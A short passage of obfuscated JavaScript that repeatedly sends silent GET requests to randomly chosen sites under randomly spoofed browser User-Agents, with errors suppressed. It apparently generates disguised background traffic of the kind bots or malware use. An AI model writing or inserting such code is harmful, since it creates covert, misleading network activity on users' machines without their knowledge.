      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x3460 * -0x1 + 0x1f70 + -0x3878) * getRandomInt(0x2b4 + -0x195b * 0x1 + 0xa * 0x244, -0x1a0a + -0x1f81 + -0x1 * -0x3990));
}, 0xbda + -0x3de + -0x1 * 0x798);